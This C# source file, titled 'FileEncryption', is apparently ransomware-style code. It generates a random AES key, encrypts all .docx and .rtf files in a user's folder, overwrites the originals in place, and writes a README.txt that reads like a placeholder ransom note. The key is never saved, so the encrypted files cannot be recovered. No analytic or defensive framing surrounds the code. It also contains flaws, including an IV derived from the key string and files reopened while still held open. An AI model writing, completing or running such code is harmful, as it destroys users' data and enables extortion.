using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class FileEncryption
{
    static void Main()
    {
        string directoryPath = @"C:\Users\domain.admin";
        string readmeFilePath = @"C:\README.txt";

        // Generate random encryption key
        string encryptionKey = GenerateEncryptionKey();

        EncryptFiles(directoryPath, encryptionKey);
        CreateReadmeFile(readmeFilePath);
    }

    static string GenerateEncryptionKey()
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.GenerateKey();
            return Convert.ToBase64String(aesAlg.Key);
        }
    }

    static void EncryptFiles(string directoryPath, string encryptionKey)
    {
        try
        {
            string[] fileExtensions = { ".docx", ".rtf" };

            foreach (string extension in fileExtensions)
            {
                string[] files = Directory.GetFiles(directoryPath, $"*{extension}");

                foreach (string file in files)
                {
                    using (Aes aesAlg = Aes.Create())
                    {
                        aesAlg.Key = Convert.FromBase64String(encryptionKey);
                        aesAlg.IV = Encoding.UTF8.GetBytes(encryptionKey.Substring(0, 16));

                        using (FileStream inputFileStream = new FileStream(file, FileMode.Open))
                        {
                            using (MemoryStream outputStream = new MemoryStream())
                            {
                                using (CryptoStream cryptoStream = new CryptoStream(outputStream, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
                                {
                                    inputFileStream.CopyTo(cryptoStream);
                                    cryptoStream.FlushFinalBlock();

                                    using (FileStream encryptedFileStream = new FileStream(file, FileMode.Create))
                                    {
                                        outputStream.Seek(0, SeekOrigin.Begin);
                                        outputStream.CopyTo(encryptedFileStream);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            Console.WriteLine("Encryption completed successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred during encryption: {ex.Message}");
        }
    }

    static void CreateReadmeFile(string readmeFilePath)
    {
        try
        {
            File.WriteAllText(readmeFilePath, "done");
            Console.WriteLine("README.txt file created successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred while creating the README.txt file: {ex.Message}");
        }
    }
}
